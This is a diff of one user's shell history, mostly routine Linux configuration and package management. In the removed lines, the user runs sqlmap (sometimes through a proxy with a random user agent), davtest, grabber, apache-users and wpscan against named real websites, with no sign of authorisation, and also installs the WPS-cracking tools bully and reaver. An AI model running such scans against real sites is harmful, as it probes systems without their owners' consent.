@@ -1,1579 +1,1000 @@
-cd /usr/share/java/esplorer/
-ls
-cd
-iwlist -a wlan0
-iwlist -i wlan0
-iwlist 
-iwlist wlan0 scanning
-ls /dev/tty
-ls /dev/ | grep ttyUSB0
-ls /dev/
-iwlist wlan0 scanning
-ls /dev/tty
-cat /dev/ttyUSB0 
-cat </dev/ttyUSB0 
-
-ls /dev/tty
-sudo modprobe cdc_mbim 
-lsmod | cdc
-esplorer 
-ls /dev/ttyUSB0 
-ls /dev/
-ls /dev/tty
-dmesg 
-journalctl -f
-sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent
-yaourt scheck
-yaourt Scheck
-yaourt php-cs
-gpg --recv-keys 293D771241515FE8
-yaourt php-cs
-sudo pacman -Ss vidalia
-yaourt vidalia
-sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent --proxy=http://13.79.159.2:80
-sudo subl3 /etc/udev/rules.d/52-nodemcu.rules
-dmesg 
-ls /dev/tty
-dmesg 
-nano /etc/avrdude.conf 
-ls /dev/
-ls /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
-cat /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
-tail -f /dev/serial/by-id/usb-1a86_USB2.0-Serial-if00-port0 
-ls /dev/
-ls /dev/udev
-idalia
-sqlmap -u "http://www.mega-mania.com.pt/resultados/?pesquisa=" --random-agent --proxy=http://13.79.159.2:80
-sudo subl3 /etc/udev/rules.d/52-nodemcu.rules
-ls /dev/nodemcu/
-ls /etc/udev/rules.d/52-nodemcu.rules 
-sudo nano /etc/udev/rules.d/52-nodemcu.rules 
-udevadm control --reload
+sudo ls /bin
+ls /bin
 sudo -s
-exit
-udevadm info -a -p $(udevadm info -q path -n /dev/ttyUSB0)
-dmesg 
-journalctl -f
-dmesg 
-ls /dev/
-nano /etc/udev/rules.d/52-nodemcu.rules 
-cat /etc/udev/rules.d/52-nodemcu.rules 
-ls /dev/serial
-ls /dev/
-sudo mkdir /dev/nodemcu
-ls /dev/
-dmesg 
-ls /dev/nodemcu/
-dmesg 
-udevadm trigger
-dmesg 
-udevadm trigger
-dmesg 
+cowsay -f tux "Carry onD
+cowsay -f tux "Carry on"
+cowsay -f apt "Carry on"
+cowsay -f beavis.zen "Carry on"
+cowsay -f kiss "Carry on"
+cowsay -f kitty "Carry on"
+cowsay -f vader "Carry on"
+cowsay -f vader-koala "Carry on"
+ssh emanuelx.dynip.sapo.pt
 sudo -s
-yaourt laptop
-sudo -s
-dmesg 
-cow
-sudo pacman -S cow
-sudo pacman -Ss cow
-sudo pacman -Ss cowsay
-sudo pacman -S cowsay
-cowsay 
-cowsay help
+sudo -k
+cowsay -l
+cowsay -e apt
+cowsay apt
+cowsay - f apt
+cowsay -f apt
 cowsay --help
-cowsay -b 1
-cowsay -b 2
-cowsay -d 2
-cowsay -g 2
-cowsay -g ola
-cowsay -h ola
-cowsay -h
-cowsay -p -h
-cowsay -p
-cowsay -p ola
-cowsay -p ola -h
-cowsay -p ola -h -e
-cowsay -p ola -h -e eyes
-cowsay -h -e eyes
-cowsay -e eyes
-cowthink 
-cowthink -p as
-sqlmap -u "https://arena.davidgouveia.net/challenge/index.php?username=admin&password="
-./davtest.pl 
-./davtest.pl -url http://supra.pt
-./davtest.pl -url http://www.supra.pt/contents/images/resized/
-./davtest.pl -url http://www.supra.pt/contents/images/
-./davtest.pl -url http://www.supra.pt/contents/
-./davtest.pl -url http://www.supra.pt/contents/downloads/
-./davtest.pl -url http://www.supra.pt/contents/emails/
-./davtest.pl -url http://www.supra.pt/contents/system/
-./davtest.pl -url http://www.supra.pt/contents/system/ -move
-./davtest.pl -url http://www.supra.pt/contents/
-./davtest.pl -url http://www.supra.pt/
-./davtest.pl -url www.supra.pt/
-yaourt fimap
-pacman -Ss fimap
-yaourt grabber
-cd ../grabber
-cd ../Grabber
-ls
-python grabber.py 
-python2 grabber.py 
-python2.7 grabber.py 
-sudo pacman -S python2-beautifulsoup3
-python2.7 grabber.py 
-python2.7 grabber.py --help
-python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -b -x -s
-python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -b
-python2.7 grabber.py -u http://www.supra.pt/?section=product&sub=view&product_id= -x
-python2.7 grabber.py -x -u http://www.supra.pt/?section=product&sub=view&product_id=
-python2.7 grabber.py -xbs -d 1 -u http://www.supra.pt/?section=product&sub=view&product_id=
-yaourt apache-users
-apache-users 
-ping supra.pt
-apache-users -h 109.71.43.177 -p 80 -s 0 -e 403 -t
-apache-users -h 109.71.43.177 -l basjks huasksa csasasa -p 80 -s 0 -e 403 -t
-apache-users -h 109.71.43.177 -l basjks huasksa csasasa -p 80 -s 0 -e 403
-yaourt davtest
-cd Downloads/
-unzip davtest-1.0.zip 
-cd davtest-1.0/
-ls
-./davtest.pl 
-pacman -Ss http::dav
-pacman -Ss perl-dav
-yaourt dav
-sudo pacman -Ss perl-http-dav
-yaourt -Ss perl-http-dav
-yaourt -Ss perl-http*
-yaourt -Ss *dav*
-pacman -Ss *dav*
-pacman -Ss dav*
-pacman -Ss dav
-perl -MCPAN -e shell
-./davtest.pl 
-bash
-yaourt parsero
-yaourt wpscan
-wpscan --help
-wpscan -u http://www.ipleiria.pt/
-wpscan --help
-ping supra.pt
-wpscan -u http://startupdesign.pt
-cd Downloads/davtest-1.0/
-./davtest.pl 
-./davtest.pl -u www.startupdesign.pt/wp-content/uploads/2012/07/
-./davtest.pl -url www.startupdesign.pt/wp-content/uploads/2012/07/
-wpscan -url http://www.startupdesign.pt/
-wpscan -url "http://www.startupdesign.pt/"
-wpscan -url "http://www.startupdesign.pt"
-c
-cd
-wpscan --help
-wpscan --url "www.startupdesign.pt"
-wpscan --url "www.startupdesign.pt" -p
-wpscan --url "www.startupdesign.pt" --p
-wpscan --help
-wpscan --url "www.startupdesign.pt" --e p
-wpscan --url "www.startupdesign.pt" --enumerate p
-sqlmap -u "http://supra.pt/startup/produto/"
-sudo pacman -S kodi
-pkill kodi
-pkill kodi.bin 
-ps -aux kodi
-ps aux kodi
-ps --aux kodi
-ps --aux
-ps aux
-pkill kodi.bin
-kill -9 10507
-sudo pacman -S pipelight
-sudo pacman -Ss pipelight
-yaourt -S pipelight
-sudo pacman -R wine
-sudo pacman -R winetricks wine
-yaourt -S pipelight
-yaourt -Sy
-yaourt -S pipelight
-pipelight-plugin --update
-pipelight-plugin --enable plugin
-pipelight-plugin --create-mozilla-plugins
-sudo pipelight-plugin --create-mozilla-plugins
-wget https://raw.githubusercontent.com/kvz/bash3boilerplate/master/main.sh
-subl3 main.sh 
-sh ./main.sh 
-sqlmap -u "http://www.carsportif.com/index.php?route=product%2Fsearch&filter_name="
-sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa="
-sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa='"
-sqlmap -u "http://www.sportino.pt/site_lista_artigos_pesquisa.php?pesquisa=cenas"
-sudo pacman -Ss bully
-yaourt -Ss bully
-yaourt -S bully
-bully --help
-yaourt reaver
-sudo pacman -Rs reaver
-yaourt reaver
-.scripts/rmod_nvidia.sh 
-sudo pacman -Syu
-r
-R
+cowsay -l
+git clone https://github.com/cmatsuoka/asciiquarium.git
+cd asciiquarium/
+./asciiquarium 
+perl sudo apt-get install libcurses-perl
+sudo apt-get install libcurses-perl
+cpan
+sudo cpan Term::Animation
+./asciiquarium 
+sudo apt search conky
+sudo apt install conky
+mkdir -p ~/.config/conky
+conky -C > ~/.config/conky/conky.conf
+subl ~/.config/conky/conky.conf 
+conky -C ~/.config/conky/conky.conf
+conky ~/.config/conky/conky.conf
+pwd
+conky ~/.config/conky/conky.conf
+sudo apt-add-repository -y ppa:teejee2008/ppa
+sudo apt update
+sudo apt-get install conky-manager
+conky-manager
+sudo apt purge conky*
+rm -rf ~/.config/conky
+rm -rf ~/.conky/
+kill -s USR1 10844
+rm -rf ~/.conky/
+cat /etc/hots
+cat /etc/hosts
+ssh emanuelx.dynip.sapo.pt
+base64 -d W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d
+base64 --help
+base64 -d "W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d"
+base64 -dW3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d"
+base64 -dW3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d
+base64 W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d
+base64 W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d -d
+base64 --help
+cat W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d
+echo "W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d"
+echo "W3siQSI6IjEiLCJCIjoiMiIsIkMiOiIzIn1d" | base64 -d
+pkill dropbox 
+dropbox 
+sudo subl /etc/default/tlp 
+tlp --help
+tlp usb
+sudo tlp usb
+sudo tlp bat
+sudo tlp ac
+lsusb -v |grep 'Bus\|MaxPower'
+sudo lsusb -v |grep 'Bus\|MaxPower'
+sudo aptitude install usbutils
+usbutils
+usb-devices 
+cat /etc/X11/xorg.conf.d/20-intel.conf
+sudo apt install teamviewer
+teamviewer 
+sudo subl /etc/X11/xorg.conf.d/20-intel.conf
+dropbox status
+dropbox stop
+dropbox start
+dropbox --help
+man dropbox 
+ssh emanuelx.dynip.sapo.pt
+cat /etc/hosts
 journalctl -f
-whereis spotify
-journalctl /usr/bin/spotify
-journalctl /usr/local/bin/spotify
-journalctl /usr/share/spotify
-exit
-sudo pacman -Syu
-yaourt -Syua
-yaourt -Sy spotify
-spotify 
-cd Documents/
-cd snapchat/AdvancedApkTool/
-java -jar apktool_2.1.1.jar 
-java -jar apktool_2.1.1.jar d casper.apk -o 4-Done/casper
-Xorg :0 -configure
-Xorg :1 -configure
-Xorg :8 -configure
-exit
-mkfontscale 
-mkfontdir 
-ls /usr/share/fonts/
-ls /usr/share/fonts/100dpi/
-mkfontscale --help
-cd /usr/share/fonts/100dpi/
-mkfontdir 
-sudo mkfontdir 
-ls
-cd ..
-cd 75dpi/
-sudo mkfontdir 
-ls
-cat /proc/acpi/bbswitch 
-cat /etc/X11/xorg.conf
-Xorg :0 -configure
-cat /var/log/Xorg.0.log
-journalctl -b
-sudo pacman -S vulkan-intel
-systool -m i915 -av
-nano /etc/X11/xorg.conf
-sudo nano /etc/X11/xorg.conf
-.scripts/rmod_nvidia.sh 
-exit
-.scripts/rmod_nvidia.sh start
-cat /proc/acpi/bbswitch 
-alsamixer 
-gem update
-gem install jekyll
-gem install rdiscount -s http://gemcutter.org
-git clone https://github.com/danielmcgraw/Jekyll-Base.git
-ls
-cd Jekyll-Base/
-tree
-ls -l
-cd ~/dotfiles/
-./update.pl 
-cd ~/Jekyll-Base/
-tree
-jekyll serve
-jekyll serve --watch
-git clone https://github.com/emanuellopes/BioFarm.git
-lpci
-lspci
-lspci | grep VGA|3D
-lspci | grep VGA
-xrandr 
-modprobe uucvideo
-ls /etc/modprobe.d/webcamera.conf 
-cat /etc/modprobe.d/webcamera.conf 
-modprobe uvcvideo
-lsusb
-cat ~/.bashrc 
-cat .scripts/rmod_nvidia.sh 
-cat /etc/X11/xorg.conf
-sudo pacman -S uvcvideo
-sudo modprobe uvcvideo
-sudo pacman -Ss uvcvideo
-sudo pacman -Qs uvcvideo
-sudo pacman -S v4l-utils
-sudo pacman -S guvcview
-guvcview 
-dmesg | tail
-exit
-yaourt firefox
-firefox --version
-sudo pacman -Rs firefox
-sudo pacman -R firefox
-yaourt firefox-ni
-gpg --recv-keys 1C69C4E55E9905DB
-sudo pacman-key -r 1C69C4E55E9905DB
-sudo pacman-key --lsign-key 1C69C4E55E9905DB
-gpg --recv-keys 1C69C4E55E9905DB
-yaourt firefox-ni
-sudo nano /etc/pacman.d/gnupg/gpg.conf 
-sudo pacman-key --lsign-key 1C69C4E55E9905DB
-sudo pacman-key -r 1C69C4E55E9905DB
-sudo nano /etc/pacman.d/gnupg/gpg.conf 
-sudo pacman-key -r 1C69C4E55E9905DB
-yaourt firefox-ni
-nano ~/.gnupg/gpg.conf 
-subl3 ~/.gnupg/gpg.conf 
-gpg --recv-keys 1C69C4E55E9905DB
-yaourt firefox-ni
-pkill firefox
-sha512sum ola
-ls
-touch cenas.txt
-sha512sum cenas.txt 
-sha512sum cenas.txt | cut -f1 -d''
-sha512sum cenas.txt | cut -d' ' -f1
-sha512sum cenas.txt | cut -d' ' -f1 | tr '\n' ''
-sha512sum cenas.txt | cut -d' ' -f1 | tr '\n' "[:space:]"
-sha512sum cenas.txt | tr '\n' '#'
-sha512sum cenas.txt | tr '\n' '#' | cut -d' ' -f1
-sha512sum cenas.txt | tr '\t' '#' | cut -d' ' -f1
-sha512sum cenas.txt | tr '\t' '#' | cut -d' ' -f1 | wc -c
-sha512sum cenas.txt | tr '\t\n' '#' | cut -d' ' -f1 | wc -c
-sha512sum cenas.txt | tr '\t\n' '' | cut -d' ' -f1 | wc -c
-sha512sum cenas.txt | tr '\t\n' ' ' | cut -d' ' -f1 | wc -c
-sha512sum cenas.txt | cut -d' ' -f1| tr -sd '\n' '' | wc -c
-yaourt -Syua
-pkill firefox
-scilab 
-sudo pacman -Syu
-yaourt -Syua
-startx
-reboot
-startweb 
-wget http://pipplware.pplware.pt/pipplware/dists/jessie/isos/pipplware_v5.1.rar
-csslint-0.6 
-ls -lh /etc
-find /etc
-find /etc -type f
-find /etc -type f -print %s
-find /etc -type f -printf %
-find /etc -type f -printf %f
-find /etc -type f -printf %f\n
-find /etc -type f -printf "%f\n"
-find /etc -type f -fprintf "%f\n"
-find /etc -type f -fprint "%f\n"
-find /etc -type f -printf "%f\n"
-find /etc -type f -printf "%f%p\n"
-find /etc -type f -printf "%f%d\n"
-find /etc -type f -printf "%f%m\n"
-find /etc -type f -printf "%f%k\n"
-sudo dd if=pipplware_v5.1.img of=/dev/mmcblk0 bs=4M
-sass
-sass --help
-sass --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache
-sass --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache --scss
-sass --scss --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache --scss
-sass --scss --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache
-scss 
-scss --help
-scss--update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache
-scss --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache
-sass --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache --compass
-compass
-sass --update /home/emanuelx/blog/css/main.scss:/home/emanuelx/main.css --stop-on-error --no-cache --compass
-node_modules/node-sass/bin
-node_modules/node-sass/bin/node-sass 
-node_modules/node-sass/bin/node-sass --help
-node_modules/node-sass/bin/node-sass 
-node_modules/node-sass/bin/node-sass --watch /home/emanuelx/blog/css/main.scss --output /home/emanuelx/main.css
-cat /home/emanuelx/blog/css/main.scss | node_modules/node-sass/bin/node-sass --watch --output /home/emanuelx/main.css
-cat /home/emanuelx/blog/css/main.scss | node_modules/node-sass/bin/node-sass --watch --output > /home/emanuelx/main.css
-cat /home/emanuelx/blog/css/main.scss | node_modules/node-sass/bin/node-sass --output > /home/emanuelx/main.css
-cd /home/emanuelx/blog/css
-cat main.scss | node_modules/node-sass/bin/node-sass --output > /home/emanuelx/main.css
-cat main.scss | ~/node_modules/node-sass/bin/node-sass --output > /home/emanuelx/main.css
-cd
-gem install scss_lint
-sass -v
-scss
-scss -v
-sass -v
-cd blog/
-ls
-ls -l
-d _site/
-cd _site/
-ls -l
-gcc -o teste teste.c 
-./teste 1 caminho file file2
-gcc -o teste teste.c 
-./teste 1 caminho file file2
-lsblk
-sudo nano /boot/grub/grub.cfg
-swapon --show
-cat /proc/acpi/bbswitch 
-cd Jekyll-Base/
-jekyll serve --incremental
-jekyll build
-cd
-jekyll build
-jekyll build -destination /home/emanuelx/site_jekyll
-jekyll build --destination /home/emanuelx/site_jekyll
-df -h
-jekyll build --destination /home/emanuelx/site_jekyll
-ls
-jekyll --help
-jekyll new blog
-cd blog/
-jekyll serve
-sudo nano /etc/hosts
-cd blog/
-jekyll serve
-.scripts/rmod_nvidia.sh 
-cd blog/
-jekyll server
-sudo pacman -Syu
-startvbox 
-sudo pacman -Rs r
-rm -rf /var/lib/pacman/db.lck 
-sudo rm -rf /var/lib/pacman/db.lck 
-sudo pacman -Rs r
-sudo pacman -Rs android-studio
-sudo pacman -Rs steam
-sudo pacman -Rs visual-studio-code 
-sudo pacman -Rs genymotion open365
-cd /opt/
-cd Visual_Paradigm_CE_13.1/
-cd uninstaller/
-sudo ./uninstall
-cd ..
-sudo rm Visual_Paradigm_CE_13.1/
-sudo rm -rf Visual_Paradigm_CE_13.1/
-rm -rf scilab/
-sudo rm -rf scilab/
-df -h
-sudo mount -r /dev/sda6 /media/disk/
-cd
-pacman -Q > pacman.txt
-pacman -Qe > pacman.txt
-pacman -Qe
-sudo pacman -Rs skype privoxy processing pidgin 
-sudo pacman -Rs bitlbee 
-pacman -Qe | awk '{print $1}' > package_list.txt
-df -h
-pacman -Qqe
-yaourt vmware
-cd Downloads/
-l
-chmod +x VMware-Player-12.1.1-3770994.x86_64.bundle 
-./VMware-Player-12.1.1-3770994.x86_64.bundle 
-sudo ./VMware-Player-12.1.1-3770994.x86_64.bundle 
-sudo vmware-modconfig --console --install-all
-yaourt vmware-patch
-sudo nano /etc/systemd/system/vmware.service
-sudo nano /etc/systemd/system/vmware-usbarbitrator.service
-vmplayer 
-systemctl start vmware
-sudo systemctl start vmware-usbarbitrator.service
-sudo systemctl status vmware-usbarbitrator.service
-sudo systemctl status vmware
-/etc/init.d/vmware start
-sudo /etc/init.d/vmware start
-vmplayer 
-yaourt vmware
-vmplayer 
-vmplayer
-sudo systemctl restart vmware
-vmplayer 
-vmware-modconfig 
-vmplayer 
-mkdir /usr/src/vmware-modules-12/
-sudo mkdir /usr/src/vmware-modules-12/
-cd /tmp/
-git clone git://github.com/bawaaaaah/dkms-workstation.git
-sed -i 's/9/12/' dkms-workstation/dkms.conf
-sudo cp dkms-workstation/Makefile dkms-workstation/dkms.conf /usr/src/vmware-modules-12/
-sudo nano /usr/src/vmware-modules-12/Makefile
-dkms install vmware-modules/12 -k $(uname -r)
-sudo dkms install vmware-modules/12 -k $(uname -r)
-cat /var/lib/dkms/vmware-modules/12/build/make.log 
-ntfsfix /dev/sda6
-sudo pacman -Syu
-sudo -s
-chown -r emanuelx /home/emanuelx/dotfiles
-chown -R emanuelx /home/emanuelx/dotfiles
-sudo chown -R emanuelx /home/emanuelx/dotfiles
-sudo -s
-ip addr
-sudo -s
-git clone https://aur.archlinux.org/package-query.git
-cd package-query/
-makepkg -si
-cd ..
-git clone https://aur.archlinux.org/yaourt.git
-cd yaourt/
-makepkg -si
-yaourt -S spotify
-yaourt -S papirus-icon-theme-gtk
-cd
-sudo pacman -S file-roller zip unrar
-systemctl status bumblebeed
-systemctl enable bumblebeed
-systemctl status bumblebeed
-sudo pacman -S clementine gstreamer gstreamer-plugins
-sudo pacman -S clementine
-sudo pacman -S gst-libav gst-plugins-bad gst-plugins-base gst-plugins-good gst-plugins-ugly
-yaourt freshplayerplugin
-yaourt pipelight
-sudo nano /etc/pacman.conf 
-yaourt pipelight
-sudo pacman -Sy
-yaourt pipelight
-sudo nano /etc/pacman.conf 
-sudo pacman -Sy
-pacman-key --init
-sud pacman-key --init
-sudo pacman-key --init
-sudo pacman-key --populate archlinux
-sudo pacman-key -r 962DDE58
-sudo pacman -Sy
-gpg
-gpg --help
-gpg -r 962DDE58
-sudo pacman -Sy
-sudo pacman-key --lsign-key 962DDE58
-sudo pacman -Sy
-pacman -SS infinality
-pacman -Ss infinality
-pacman -S infinality-bundle
-sudo pacman -S infinality-bundle
-sudo pacman -S xdg-user-dirs
-xdg-user-dirs-update 
-xdg-user-dir TEMPLATES
-pipelight-plugin --create-mozilla-plugins
-sudo pipelight-plugin --create-mozilla-plugins
-cat ~/.bashrc 
-exit
-vainfo 
-vdpauinfo | grep "Information string:"
-sudo pacman -S vdpauinfo
-vdpauinfo | grep "Information string:"
-vdpauinfo
-whereis libvdpau_va_gl.so
-sudo pacman -S libvdpau-va-gl
-vdpauinfo
-vdpauinfo | grep "Information string:"
-vdpauinfo
-pspci
-lspci
-yaourt libva-intel-driver-g45-h264
-exit
-sudo pacman -S ruby
-bash
-systemctl status bumblebeed
-cat /proc/acpi/bbswitch 
-ls ~/.local/share/cinnamon/extensions/
-cd .scripts/
-ls
-chmod +x rmod_nvidia.sh 
-./rmod_nvidia.sh 
-./rmod_nvidia.sh start
-sudo pacman -S libva-intel-driver
-sudo pacman -S libva-vdpau-driver
-sudo pacman -S libva-mesa-driver
-sudo pacman -S mesa-vdpau
-sudo pacman -S nvidia-utils
-mvp
-sudo pacman -S smplayer
-cd
-sudo pacman -S xf86-input-synaptics
-yaourt sublime
-sudo pacman -Ss gtk-murrine
-sudo pacman -Ss gtk-engine-murrine
-sudo pacman -S gtk-engine-murrine
-exit
-wget https://cdn.fstatic.com/media/movies/covers/2010/07/thumbs/f1ab14b3c3125ccdd001bae4e3aedaa0_jpg_290x478_upscale_q90.jpg
-yaourt -Ss meocloud
-yaourt -S meocloud-gui
-meocloud-gui 
-sudo pacman -S gnome-keyring
-pacman -Ss nemo
-pacman -S nemo-share nemo-fileroller nemo-preview
-sudo pacman -S nemo-share nemo-fileroller nemo-preview
-nemo -q
-cinnamon --version
-guake-prefs 
-exit
-cd /etc/fonts/
-cd /usr/share/fonts/
-ls
-cd 100dpi/
-mkfontdir
-sudo mkfontdir
-cd ..
-cd 75dpi/
-mkfontdir 
-sudo mkfontdir 
-ls
-cd ..
-ls
-cd cantarell/
-ls
-mkfontdir 
-sudo mkfontdir 
-ls
-cd ..
-cd cyrillic/
-ls
-sudo mkfontdir 
-cd ..
-cd OTF/
-sudo mkfontdir 
-sudo pacman -S acpid
-cat /var/log/Xorg.0.log
-sudo nano /etc/mkinitcpio.conf 
-sudo mkinitcpio -p linux
-sudo nano /etc/mkinitcpio.conf 
-mkinitcpio -p linux
-ls /boot/
-ls /boot
-lsblk
-sudo nano /etc/fstab 
-sudo -s
-cat /var/log/Xorg.0.log
-cat /var/log/Xorg.0.log | grep WW
-sudo pacman -S xf86-input-evdev
-sudo subl3 /etc/X11/xorg.conf
-ls /root/
-sudo ls /root/
-sudo cat /root/xorg.conf.new
-sudo cp /root/xorg.conf.new /home/emanuelx/xorg.conf.new
-sudo -s
-sudo systemctl enable acpid
-cat /var/log/Xorg.0.log
-exit
-startx
-loadkeys pt-latin1
-sudo loadkeys pt-latin1
-cat /var/log/Xorg.0.log
-sudo -s
-startx
+sudo apt update 
+sudo apt upgrade
+tlp status
+tlp stat
+sudo tlp stat
+ps -aux | grep tlp
+sudo systemctl start tlp
+sudo systemctl status tlp
+sudo apt-get install indicator-cpufreq
+indicator-cpufreq
+python --version
+sudo  pip install instantmusic
+sudo apt install pip
+sudo apt install pyton-pip
+sudo apt install python-pip
+sudo  pip install instantmusic
+pip install --upgrade pip
+sudo  pip install instantmusic
+pip install instantmusic
+sudo -H
+sudo -u emanuelx
+sudo -u emanuelx -h pip install instantmusic
+sudo -u emanuelx -H pip install instantmusic
+sudo pip install setuptools
+pip install instantmusic
+sudo -u emanuelx -H pip install instantmusic
+sudo apt install libav-tools
+instantmusic
+sudo  pip install instantmusic
+instantmusic -h
+instantmusic -s LOONY JOHNSON - VAI VAI
+instantmusic -h
+instantmusic -help
+whereis instantmusic
+cat /usr/local/bin/instantmusic 
+subl  /usr/local/bin/instantmusic 
+instantmusic -s LOONY JOHNSON - VAI VAI
+nslookup 91.212.150.92
+tlp stop
 journalctl -f
-cat /var/log/Xorg.8.log
-groups root
-sudo gpasswd -a root video
-cat /var/log/Xorg.0.log
-cat /var/log/Xorg.8.log
-exit
-gem install scss_lint
-sudo pacman -S cppcheck
-sudo npm install -g csslint
-sudo npm install -g jshint
-phpcs
-sudo pacman -S phpcs
-yaourt phpcs
-curl -OL https://squizlabs.github.io/PHP_CodeSniffer/phpcs.phar
-php phpcs.phar -h
-sudo pacman -S php
-php phpcs.phar -h
-sudo pacman -S apache
-sudo pacman -S mysql
-sudo nano /etc/httpd/conf/httpd.conf 
-sudo systemctl start httpd
-sudo systemctl status httpd
-sudo nano /etc/httpd/conf/httpd.conf +167
-sudo nano +167 /etc/httpd/conf/httpd.conf 
-sudo systemctl start httpd
-sudo systemctl status httpd
-php --version
-sudo nano /etc/php/php.ini
-sudo nano +167 /etc/httpd/conf/httpd.conf 
-sudo subl3 /etc/httpd/conf/httpd.conf 
-sudo systemctl status httpd
-sudo pacman -S php
-sudo systemctl start httpd
-sudo systemctl status httpd
-mysql_secure_installation 
-sudo systemctl start mysqld
-mysql_secure_installation 
-mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
-sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql
-sudo mysql_secure_installation 
-sudo systemctl start mysqld
-sudo systemctl status mysqld
-sudo mysql_secure_installation 
-ls
-curl -OL https://squizlabs.github.io/PHP_CodeSniffer/phpcs.phar
-ls
-php phpcs.phar -h
-curl -OL https://squizlabs.github.io/PHP_CodeSniffer/phpcbf.phar
-pear pear install PHP_CodeSniffer
-sudo pacman -S pear
-sudo pacman -S lib32-alsa-lib
-sudo pacman -S lib32-alsa-plugins
-sudo pacman -S lib32-alsa-libpulse
-sudo pacman -S lib32-libpulse
-sudo pacman -S lib32-mesa-libgl
-sudo pacman -S vulkan-intel
-sudo pacman -S lib32-virtualgl lib32-nvidia-utils lib32-mesa-libgl
-yaourt libgl-switcheroo
-yaourt -Ss libgl-switcheroo
-mkdir ~/.mozilla/firefox/m35l9dn5.default/chrome
-subl3  ~/.mozilla/firefox/m35l9dn5.default/chrome/userChrome.css
-cat /var/log/Xorg.0.log
-sudo pacman -S mesa-dems
-sudo pacman -S mesa-demos
-optirun glxinfo
-optirun glxgears
-optirun glxgears -info
-systemctl status bumblebeed
-sudo pacman -S xserver-xorg-input-kbd
-sudo pacman -Ss xserver-xorg
-sudo pacman -Ss xf86-input-mouse
-sudo pacman -S xf86-input-mouse
-systemctl status bumblebeed
-optirun glxgears -info
-systemctl status bumblebeed
-optirun glxgears -info
-systemctl status bumblebeed
-ln -s /home/emanuelx/MEOCloud/sublime-text-3/ /home/emanuelx/.config/sublime-text-3
-gem install sass
-sudo pacman -S nodejs
-npm install -g htmlhint@latest
-sudo pacman -S npm
-npm install -g htmlhint@latest
-sudo npm install -g htmlhint@latest
-sudo pacman -S gtk-engines gtk-engine-aurora
-sudo pacman -S dostools
-sudo pacman -S dostool
-sudo pacman -S dos
-sudo pacman -Ss dos
-sudo pacman -S dosfstools
-lsblk
-exit
-sudo nano /etc/modprobe.d/webcamera.conf 
-sudo pacman -S cheese
-sudo pacman -Ss v4l
-sudo pacman -Ss lib32-v4l-utils
-sudo pacman -S lib32-v4l-utils
-modprobe uvcvideo
-sudo modprobe uvcvideo
+npm install -g typescript
+sudo npm install -g typescript
+ndsakdas
+tsc 
+sudo nano /etc/default/tlp 
+sudo apt remove tlp
+node -v
+nodejs 
+sudo apt-get install nodejs-legacy
+tsc
+sudo add-apt-repository ppa:webupd8team/unstable
+sudo apt update
+sudo apt-get install laptop-mode-tools
+gksu lmt-config-gui
+sudo nemo
+gksu lxappearance
+sudo apt installlxappearance
+sudo apt install lxappearance
+gksu lxappearance
+gksu lmt-config-gui
+sudo gpartd
+sudo gparted
+sudo gnome-disk
+sudo gnome-disks
+uptime
+sudo apt install gnome-disk-utility
+gnome-disk-utility
+gnome-disks
+uptime
+ansd
+sudo apt-get install smartmontools
+smartctl -a /dev/sda | grep Media_Wearout_Indicator
+sudo smartctl -a /dev/sda
+sudo smartctl -a /dev/sda | grep Media_Wearout_Indicator
+sudo smartctl -a /dev/sda
+sudo hdparm -I /dev/sda | grep "TRIM supported"
+sudo subl /etc/fstab 
+sudo subl /etc/cron.daily/trim
+sudo fstrim -v /
+sudo chmod +x /etc/cron.daily/trim
+fstrim -v /home
+sudo fstrim -v /home
+sudo apt upgrade
+sudo netbeans
+sudo apt update
+sudo apt list --upgradable
+sudo apt upgrade
+fc-cache -v
+uptime
+ifconfig wlan0 down
+sudo ifconfig wlan0 down
+sudo ifconfig wlan0 up
+sudo subl /etc/X11/xorg.conf.d/20-intel.conf
+sudo subl /etc/default/grub
+sudo update-grub
+sudo subl /etc/X11/xorg.conf.d/20-intel.conf
+glxinfo|egrep "OpenGL vendor|OpenGL renderer"
+lspci -vnnn | perl -lne 'print if /^\d+\:.+(\[\S+\:\S+\])/' | grep VGA
+dmesg |tail
+sudo apt update
+sudo apt upgrade
+sudo subl /etc/X11/xorg.conf.d/20-intel.conf
+mkdir app
+rm app
+rm -rf app
+cd MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/angular-quickstart/
+mkdir app
+sudo subl /etc/default/grub
+sudo apt search visual-studio-code
+mkdir angular-quickstart
+cd angular-quickstart/
+cd 
+cd MEOCloud/Escola/3º\ ano/Desenvolvimento\ de\ aplicações\ distribuidas/
+cd angular-quickstart/
+npm install
+npm start
+cd ..
+mkdir angular-tour-of-heroes
+cd angular-tour-of-heroes/
+mkdir app
+cd ..
+npm angular-quickstart/
+cd angular-quickstart/
+npm start
+dropbox status
+pkill dropbox 
+dropbox status
